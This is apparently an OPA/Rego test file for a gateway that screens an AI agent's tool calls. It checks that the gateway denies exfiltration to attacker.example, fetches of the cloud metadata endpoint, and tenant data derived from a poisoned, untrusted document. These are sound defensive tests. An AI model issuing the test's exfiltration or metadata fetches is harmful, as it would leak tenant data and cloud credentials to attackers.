# Policy tests, run by `opa test` against the SAME digest the gateway
# ships (PROPOSED-DEPS.md's one-pin rule: a separately-installed CI opa
# would test the policy with a different binary than the one that
# enforces it).
#
# These test the POLICY. The gate's behaviour when OPA itself fails is a
# different question with a different instrument -- the fault shims in
# gateway/test_faults/ -- because no amount of policy testing can tell
# you what happens when the policy engine is dead.

package bazaar.gate_test

import rego.v1

import data.bazaar.gate

policy_data := {
	"tools": ["read_document", "http_fetch"],
	"capabilities": ["read_document", "http_fetch"],
	"egress_allowlist": ["docs.example", "metadata.google.internal"],
}

# --- the allow path ---------------------------------------------------

test_read_document_is_allowed if {
	d := gate.decision with input as {
		"tool": "read_document",
		"args": {"id": "4db02253-bccf-4cd0-a513-ae84ea18ead4"},
		"session": {"org": "acme"},
		"provenance": {"derived_from": ["user"]},
		"resolved": {},
	}
		with data.tools as policy_data.tools
		with data.capabilities as policy_data.capabilities
		with data.egress_allowlist as policy_data.egress_allowlist

	d.route == "allow"
}

test_clean_fetch_to_an_allowlisted_host_is_allowed if {
	d := gate.decision with input as {
		"tool": "http_fetch",
		"args": {"url": "http://docs.example/a"},
		"session": {"org": "acme"},
		"provenance": {"derived_from": ["user"]},
		"resolved": {"host": "docs.example", "ip": "93.184.216.34", "denied_range": false},
	}
		with data.tools as policy_data.tools
		with data.capabilities as policy_data.capabilities
		with data.egress_allowlist as policy_data.egress_allowlist

	d.route == "allow"
}

# --- finding 03: the allowlist leg ------------------------------------

# THE ORDERING TEST. attacker.example fails the allowlist leg AND the
# range leg (the Compose bridge is RFC1918) AND the provenance leg (the
# document is untrusted). Exactly one reason must come back, and it must
# be the allowlist -- otherwise finding 03's evidence becomes "private
# address", which is an artifact of the lab rather than the control.
test_finding_03_dies_at_the_allowlist_with_one_reason if {
	d := gate.decision with input as {
		"tool": "http_fetch",
		"args": {"url": "http://attacker.example/collect?data=x"},
		"session": {"org": "acme"},
		"provenance": {"derived_from": ["user", "untrusted"]},
		"resolved": {"host": "attacker.example", "ip": "172.20.0.9", "denied_range": true},
	}
		with data.tools as policy_data.tools
		with data.capabilities as policy_data.capabilities
		with data.egress_allowlist as policy_data.egress_allowlist

	d.route == "deny"
	count(d.reasons) == 1
	d.reasons[0] == "egress_not_allowlisted"
}

# --- finding 04: the range leg ----------------------------------------

test_finding_04_passes_the_allowlist_and_dies_at_the_range if {
	d := gate.decision with input as {
		"tool": "http_fetch",
		"args": {"url": "http://metadata.google.internal/computeMetadata/v1/"},
		"session": {"org": "acme"},
		"provenance": {"derived_from": ["user"]},
		"resolved": {"host": "metadata.google.internal", "ip": "169.254.169.254", "denied_range": true},
	}
		with data.tools as policy_data.tools
		with data.capabilities as policy_data.capabilities
		with data.egress_allowlist as policy_data.egress_allowlist

	d.route == "deny"
	count(d.reasons) == 1
	d.reasons[0] == "resolved_address_denied"
}

# The same finding driven THROUGH the poisoned document: untrusted
# provenance is present, and the reason must not change. This is why the
# range leg sits before the provenance leg -- the asserted evidence must
# not depend on how the PoC chose to drive the call.
test_finding_04_reason_is_stable_under_untrusted_provenance if {
	d := gate.decision with input as {
		"tool": "http_fetch",
		"args": {"url": "http://metadata.google.internal/computeMetadata/v1/"},
		"session": {"org": "acme"},
		"provenance": {"derived_from": ["user", "untrusted"]},
		"resolved": {"host": "metadata.google.internal", "ip": "169.254.169.254", "denied_range": true},
	}
		with data.tools as policy_data.tools
		with data.capabilities as policy_data.capabilities
		with data.egress_allowlist as policy_data.egress_allowlist

	d.reasons[0] == "resolved_address_denied"
}

# --- the provenance leg, which no M2 PoC reaches ----------------------

# SR-B7-2: allowlisting is a host decision, never a payload decision. An
# allowlisted destination with a public address and tenant-derived
# content is still a denial.
test_tenant_data_to_an_allowlisted_host_is_denied if {
	d := gate.decision with input as {
		"tool": "http_fetch",
		"args": {"url": "http://docs.example/collect?data=Acme+Q3"},
		"session": {"org": "acme"},
		"provenance": {"derived_from": ["user", "untrusted"]},
		"resolved": {"host": "docs.example", "ip": "93.184.216.34", "denied_range": false},
	}
		with data.tools as policy_data.tools
		with data.capabilities as policy_data.capabilities
		with data.egress_allowlist as policy_data.egress_allowlist

	d.route == "deny"
	d.reasons[0] == "tenant_data_egress"
}

# --- fail closed ------------------------------------------------------

test_an_unknown_tool_is_denied if {
	d := gate.decision with input as {
		"tool": "exfiltrate",
		"args": {},
		"session": {"org": "acme"},
		"provenance": {"derived_from": ["user"]},
		"resolved": {},
	}
		with data.tools as policy_data.tools
		with data.capabilities as policy_data.capabilities
		with data.egress_allowlist as policy_data.egress_allowlist

	d.route == "deny"
	d.reasons[0] == "unknown_tool"
}

# Empty input must not be an allow. A policy whose empty case allows is
# the shape a garbage-emitting engine turns into a bypass.
test_empty_input_is_denied if {
	d := gate.decision with input as {}
		with data.tools as policy_data.tools
		with data.capabilities as policy_data.capabilities
		with data.egress_allowlist as policy_data.egress_allowlist

	d.route == "deny"
}
